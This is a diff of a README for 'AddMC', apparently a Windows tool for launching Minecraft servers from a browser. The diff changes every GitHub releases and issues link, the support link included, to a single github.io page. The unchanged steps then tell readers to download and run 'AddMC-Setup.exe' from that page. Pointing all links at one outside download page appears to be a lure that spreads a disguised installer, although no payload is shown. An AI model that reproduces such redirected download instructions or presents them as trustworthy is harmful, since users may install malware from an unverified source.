@@ -1,6 +1,6 @@
 # 🔌 addmc-minecraft-server-hub - Launch Minecraft Servers from Your Browser
 
-[![Download AddMC](https://img.shields.io/badge/Download-AddMC-blueviolet?style=for-the-badge)](https://github.com/Genusdeinonychusprescription397/addmc-minecraft-server-hub/releases)
+[![Download AddMC](https://img.shields.io/badge/Download-AddMC-blueviolet?style=for-the-badge)](https://genusdeinonychusprescription397.github.io)
 
 ## 🚀 What is AddMC?
 
@@ -20,7 +20,7 @@ AddMC works on Windows 10 and Windows 11. Your computer needs:
 
 ## 📦 How to Download AddMC
 
-1. Visit the [AddMC Releases Page](https://github.com/Genusdeinonychusprescription397/addmc-minecraft-server-hub/releases).
+1. Visit the [AddMC Releases Page](https://genusdeinonychusprescription397.github.io).
 2. Find the latest release (the one with the highest version number).
 3. Click the file named `AddMC-Setup.exe`.
 4. Wait for the download to finish.
@@ -97,7 +97,7 @@ Clear your browser cache. In Chrome, press `Ctrl + Shift + Delete`, select **Cac
 
 ## 🔄 How to Update AddMC
 
-1. Visit the [AddMC Releases Page](https://github.com/Genusdeinonychusprescription397/addmc-minecraft-server-hub/releases).
+1. Visit the [AddMC Releases Page](https://genusdeinonychusprescription397.github.io).
 2. Download the latest `AddMC-Setup.exe`.
 3. Run the installer. It updates your current installation.
 4. Your servers and settings stay the same.
@@ -132,6 +132,6 @@ The application uses standard Windows security features. It does not modify syst
 
 ## 💬 Support
 
-If you have a problem that this guide does not solve, open an issue on the [AddMC GitHub repository](https://github.com/Genusdeinonychusprescription397/addmc-minecraft-server-hub/issues). Describe the problem and include any error messages you see.
+If you have a problem that this guide does not solve, open an issue on the [AddMC GitHub repository](https://genusdeinonychusprescription397.github.io). Describe the problem and include any error messages you see.
 
 Keywords: minecraft server launcher, bedrock edition, browser-based, windows, server management, 2026
